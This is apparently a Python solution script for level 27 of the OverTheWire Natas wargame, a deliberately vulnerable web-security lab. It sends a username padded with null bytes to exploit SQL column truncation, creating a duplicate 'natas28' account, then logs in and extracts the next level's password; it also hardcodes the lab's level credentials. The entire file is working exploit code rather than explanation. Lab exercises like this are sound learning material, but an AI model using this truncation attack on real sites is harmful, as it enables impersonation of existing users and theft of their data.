import re, requests
USER = 'natas27'
PASS = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'
URL = f'http://{USER}.natas.labs.overthewire.org/index.php'
AUTH_BASIC = requests.auth.HTTPBasicAuth(USER, PASS)
BURP = {"http": "http://127.0.0.1:8080"}
headers = {"Content-Type": "application/x-www-form-urlencoded"}

payload_for_truncate = 'natas28' + ('%00' * 57) + 'j' 
first_body = f'username={payload_for_truncate}&password=jotace'
first_post = requests.post(url=URL, auth=AUTH_BASIC, data=first_body, headers=headers, proxies=BURP)
end_body = 'username=natas28&password=jotace'
end_post = requests.post(url=URL, auth=AUTH_BASIC, data=end_body, headers=headers, proxies=BURP)
print(end_post.text)
print('The pass of the natas28 is:', re.findall('([0-9a-zA-Z]{32})', end_post.text)[1])